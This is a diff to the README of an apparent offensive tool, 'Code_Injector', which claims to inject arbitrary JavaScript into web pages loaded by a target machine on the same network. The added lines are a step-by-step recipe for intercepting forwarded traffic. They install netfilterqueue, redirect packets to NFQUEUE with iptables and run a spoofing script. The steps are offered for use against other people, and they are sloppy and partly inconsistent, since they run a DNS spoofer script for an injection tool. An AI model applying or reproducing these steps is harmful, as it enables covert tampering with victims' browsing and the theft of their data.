@@ -1,2 +1,11 @@
 # Code_Injector
 this program will let you to inject any java script code to website ont he target machine connected in same network.
+how to use 
+pip install netfilterqueue
+servive apache2 start 
+edit the code by changing the injection code on line number
+iptables -I FORWARD -j NFQUEUE --queue-num 0
+now in other terminal 
+python dns_spoofer.py
+after you have completed your task 
+iptables --flush
